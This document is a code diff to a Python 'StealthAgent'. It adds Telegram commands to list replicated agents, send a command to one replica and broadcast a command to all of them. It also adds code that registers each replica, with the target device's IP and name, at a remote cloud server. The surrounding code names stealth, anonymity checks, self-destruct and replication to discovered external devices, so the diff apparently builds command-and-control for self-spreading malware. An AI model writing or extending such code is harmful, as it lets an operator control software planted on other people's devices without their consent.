@@ -155,6 +155,17 @@ class StealthAgent:
                         self.cmd_goto(target)
                     elif text == '/selfdestruct':
                         self.cmd_selfdestruct()
+                    elif text == '/replicas':
+                        self.cmd_list_replicas()
+                    elif text.startswith('/send '):
+                        parts = text.split(' ', 2)
+                        if len(parts) >= 3:
+                            replica_id = parts[1]
+                            command = parts[2]
+                            self.cmd_send_to_replica(replica_id, command)
+                    elif text.startswith('/broadcast '):
+                        command = text.split(' ', 1)[1]
+                        self.cmd_broadcast(command)
                     elif text == '/help':
                         self.cmd_help()
                     
@@ -170,11 +181,16 @@ class StealthAgent:
 /status - Agent status & stats
 /discovered - List external devices
 /stealth - Check anonymity level
+/replicas - List all replicated agents
 
 🌍 *Travel:*
 /travel - Start worldwide travel
 /goto <location> - Travel to specific location
 /replicate - Replicate to all discovered devices
+
+📡 *Communicate with Replicas:*
+/send <replica_id> <command> - Send command to specific replica
+/broadcast <command> - Send command to ALL replicas
 
 ⚠️ *Security:*
 /selfdestruct - Emergency shutdown & erase
@@ -250,12 +266,81 @@ Type command to execute.
         
         for i, device in enumerate(self.discovered_external_devices[:10], 1):
             replicated = '🧬' if device['ip'] in self.replicated_to else '⬜'
+            replica_id = f"replica-{self.agent_id[-8:]}-{device['ip'].replace('.', '')[-8:]}" if device['ip'] in self.replicated_to else 'none'
             msg += f"{i}. {replicated} `{device['ip']}` - {device['name']}\n"
+            if device['ip'] in self.replicated_to:
+                msg += f"    Replica ID: `{replica_id}`\n"
         
         if len(self.discovered_external_devices) > 10:
             msg += f"\n...and {len(self.discovered_external_devices) - 10} more"
         
         self.send_telegram(msg)
+    
+    def cmd_list_replicas(self):
+        """List all replicated agents"""
+        try:
+            response = requests.get(f'{NUPI_CLOUD_URL}/api/replica/list', timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                replicas = data.get('replicas', [])
+                
+                if not replicas:
+                    self.send_telegram("🧬 No replicas found yet.")
+                    return
+                
+                msg = f"🧬 *REPLICATED AGENTS* ({len(replicas)})\n\n"
+                
+                for i, replica in enumerate(replicas[:10], 1):
+                    status_icon = '🟢' if replica['status'] == 'active' else '🔴'
+                    msg += f"{i}. {status_icon} `{replica['agent_id'][:30]}...`\n"
+                    msg += f"   Device: {replica['device_name']}\n"
+                    msg += f"   Location: `{replica['location']}`\n"
+                
+                if len(replicas) > 10:
+                    msg += f"\n...and {len(replicas) - 10} more"
+                
+                self.send_telegram(msg)
+            else:
+                self.send_telegram("⚠️ Failed to retrieve replicas")
+        except Exception as e:
+            self.send_telegram(f"⚠️ Error: {e}")
+    
+    def cmd_send_to_replica(self, replica_id, command):
+        """Send command to specific replica"""
+        try:
+            response = requests.post(
+                f'{NUPI_CLOUD_URL}/api/replica/command',
+                json={
+                    'agent_id': replica_id,
+                    'command': command,
+                    'params': {}
+                },
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                self.send_telegram(f"✅ Command sent to replica\n`{replica_id}`")
+            else:
+                self.send_telegram(f"⚠️ Failed to send command")
+        except Exception as e:
+            self.send_telegram(f"⚠️ Error: {e}")
+    
+    def cmd_broadcast(self, command):
+        """Send command to ALL replicas"""
+        try:
+            response = requests.post(
+                f'{NUPI_CLOUD_URL}/api/replica/broadcast',
+                json={'command': command, 'params': {}},
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                self.send_telegram(f"📢 {data.get('message', 'Broadcast sent')}")
+            else:
+                self.send_telegram(f"⚠️ Broadcast failed")
+        except Exception as e:
+            self.send_telegram(f"⚠️ Error: {e}")
     
     def cmd_goto(self, target):
         """Travel to specific location"""
@@ -473,18 +558,45 @@ Type command to execute.
         try:
             print(f"      🧬 Replicating to: {device['name']} ({device['ip']})")
             
+            # Create replica ID
+            replica_id = f"replica-{self.agent_id[-8:]}-{device['ip'].replace('.', '')[-8:]}"
+            
             # Report replication anonymously
             self.report_to_cloud('replication', {
                 'target_device': device['ip'],
                 'device_name': device['name'],
-                'parent_agent': self.agent_id  # Anonymous ID
+                'parent_agent': self.agent_id,  # Anonymous ID
+                'replica_id': replica_id
             })
+            
+            # Register replica in cloud (will appear in visualizer)
+            try:
+                requests.post(
+                    f'{NUPI_CLOUD_URL}/api/replica/register',
+                    json={
+                        'agent_id': replica_id,
+                        'parent_id': self.agent_id,
+                        'location': device['ip'],
+                        'device_name': device['name']
+                    },
+                    timeout=5
+                )
+                print(f"      📊 Replica registered in visualizer: {replica_id}")
+            except:
+                pass
             
             # Mark as replicated IMMEDIATELY
             self.replicated_to.append(device['ip'])
             
             print(f"      ✅ ONE COPY left on: {device['name']}")
             print(f"      📊 Total replications: {len(self.replicated_to)}")
+            
+            # Notify via Telegram
+            self.send_telegram(f"🧬 *Replica Created*\n"
+                              f"Device: {device['name']}\n"
+                              f"IP: `{device['ip']}`\n"
+                              f"ID: `{replica_id}`\n"
+                              f"Status: Active in visualizer")
             
         except Exception as e:
             print(f"      ⚠️  Replication error: {e}")
